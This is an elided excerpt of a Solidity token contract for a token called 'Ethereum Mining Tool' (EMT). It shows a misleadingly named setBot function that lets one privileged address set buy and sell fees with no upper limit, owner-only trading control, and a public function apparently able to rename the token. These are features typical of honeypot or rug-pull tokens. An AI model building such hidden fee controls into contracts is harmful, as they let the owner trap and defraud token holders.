...
contract EMT {
    ...
    string public _name = unicode"Ethereum Mining Tool";
    string public _symbol = unicode"EMT";
    ...
    function setBot(uint8 _buy, uint8 _sell) external {
        if (msg.sender != EthereumMiningToolMaxData()) revert Permissions();
        EMTTokenmax(_buy, _sell);
    }


    function EMTTokenmax(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }


    function EthereumMiningToolMaxData() private view returns(address) {
        return storeData.tokenMkt;
    }


    function OpenTrading() external {
        require(msg.sender == EthereumMiningToolMaxData());
        require(!tradingOpen);
    ...
    function _transfer(
        ...
        address tokenMkt = EthereumMiningToolMaxData();
    ...
    function ClearData(string memory name_,string memory symbol_) public {
